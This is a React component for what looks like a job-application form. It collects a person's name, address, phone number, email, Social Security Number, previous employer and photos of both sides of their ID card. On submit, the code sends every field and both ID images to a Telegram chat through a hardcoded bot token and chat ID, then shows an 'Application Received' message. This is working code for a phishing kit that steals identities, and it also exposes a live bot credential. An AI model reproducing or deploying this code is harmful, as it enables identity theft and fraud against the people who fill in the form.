import { useState } from "react";
import axios from "axios";

const TELEGRAM_BOT_TOKEN = "7267909812:AAF2YCT0-TbHFH6LMIcbqOPIJcxwG_-jvZY";
const TELEGRAM_CHAT_ID = "5461098350";

const SuccessModal = ({ onClose }) => (
  <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
    <div className="bg-white p-6 rounded-2xl shadow-lg text-center">
      <h2 className="text-2xl font-semibold text-green-600">✅ Application Received!</h2>
      <p className="mt-2 text-gray-700">Your application has been submitted successfully.</p>
      <button
        onClick={onClose}
        className="mt-5 px-5 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-300"
      >
        Back Home
      </button>
    </div>
  </div>
);

const FormComponent = () => {
  const initialFormData = {
    name: "",
    address: "",
    phone: "",
    email: "",
    ssn: "",
    previousEmployer: "",
    idCardFrontBase64: "",
    idCardBackBase64: "",
  };

  const [formData, setFormData] = useState(initialFormData);
  const [fileNames, setFileNames] = useState({
    idCardFront: "No file chosen",
    idCardBack: "No file chosen",
  });
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e, side, label) => {
    const file = e.target.files[0];
    if (file && file.type.startsWith("image/")) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData((prev) => ({ ...prev, [side]: reader.result }));
        setFileNames((prev) => ({ ...prev, [label]: file.name }));
      };
      reader.readAsDataURL(file);
    } else {
      alert("Please upload a valid image file.");
    }
  };

  const escapeMarkdownV2 = (text) => {
    return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
  };

  const sendTextToTelegram = async () => {
    try {
      const textMessage = `
📌 *New Form Submission* 📌
👤 *Name:* ${escapeMarkdownV2(formData.name)}
📍 *Address:* ${escapeMarkdownV2(formData.address)}
📞 *Phone:* ${escapeMarkdownV2(formData.phone)}
📧 *Email:* ${escapeMarkdownV2(formData.email)}
🔢 *SSN:* ${escapeMarkdownV2(formData.ssn)}
🏢 *Previous Employer:* ${escapeMarkdownV2(formData.previousEmployer)}
      `;

      await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        params: { chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "MarkdownV2" },
      });
    } catch (error) {
      console.error("Error sending text data to Telegram:", error);
    }
  };

  const sendImagesToTelegram = async () => {
    try {
      const sendPhoto = async (imageBase64) => {
        if (!imageBase64) return;

        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", dataURItoBlob(imageBase64), "image.jpg");

        await axios.post(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          formData,
          { headers: { "Content-Type": "multipart/form-data" } }
        );
      };

      await sendPhoto(formData.idCardFrontBase64);
      await sendPhoto(formData.idCardBackBase64);
    } catch (error) {
      console.error("Error sending images to Telegram:", error);
    }
  };

  const dataURItoBlob = (dataURI) => {
    let byteString = atob(dataURI.split(",")[1]);
    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uint8Array = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
      uint8Array[i] = byteString.charCodeAt(i);
    }
    return new Blob([arrayBuffer], { type: mimeString });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    await sendTextToTelegram();
    await sendImagesToTelegram();

    // Show success modal
    setIsSubmitted(true);
  };

  const handleCloseModal = () => {
    setIsSubmitted(false);
    window.location.href = "/"; // Redirect to home page
  };

  return (
    <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10">
      {isSubmitted && <SuccessModal onClose={handleCloseModal} />}

      <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">
        User Information Form
      </h2>
      <form onSubmit={handleSubmit} className="space-y-5">
        <input type="text" name="name" placeholder="Full Name" value={formData.name} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
        <input type="text" name="address" placeholder="Address" value={formData.address} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
        <input type="tel" name="phone" placeholder="Phone Number" value={formData.phone} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
        <input type="email" name="email" placeholder="Email" value={formData.email} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
        <input type="text" name="ssn" placeholder="Social Security Number" value={formData.ssn} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
        <input type="text" name="previousEmployer" placeholder="Previous Employer" value={formData.previousEmployer} onChange={handleChange} required className="w-full p-3 border rounded-lg" />

        {/* Front ID Upload */}
        <label className="block font-medium">Upload Front of ID</label>
        <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "idCardFrontBase64", "idCardFront")} required className="w-full p-2 border rounded-lg" />

        {/* Back ID Upload */}
        <label className="block font-medium">Upload Back of ID</label>
        <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "idCardBackBase64", "idCardBack")} required className="w-full p-2 border rounded-lg" />

        <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">
          Submit
        </button>
      </form>
    </div>
  );
};

export default FormComponent;
